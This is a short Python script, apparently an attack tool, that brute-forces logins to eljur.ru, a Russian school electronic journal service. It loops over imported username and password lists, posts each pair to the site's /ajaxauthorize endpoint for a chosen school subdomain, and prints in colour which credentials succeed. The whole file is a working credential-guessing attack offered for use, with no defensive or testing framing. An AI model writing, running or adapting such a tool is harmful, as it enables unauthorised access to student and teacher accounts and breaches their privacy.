from turtle import pos
from requests import post
from database import paswords
from database import usernames
from colorama import init
from colorama import Fore, Back, Style
import time

init()
def solve(schooldomain):
    for i in paswords:
        for x in usernames:
            start_time = time.time()
            params= {
                'username':x,
                'password':i
            }
            req = post(f'https://{schooldomain}.eljur.ru/ajaxauthorize', params=params)
            answ = req.json()['result']
            if answ is False:
                print(Fore.RED + f'Пробую - {x}:{i} | Ошибка | {round((time.time() - start_time)*1000)}ms')
            else:
                print(Fore.GREEN + f'Пробую - {x}:{i} | Данные верны | {round((time.time() - start_time)*1000)}, 5)ms')

if __name__ == "__main__":
    schooldomain = input('Введите домен вашей школы. (символы перед .eljure.ru, Например - soch152: ')
    solve(schooldomain)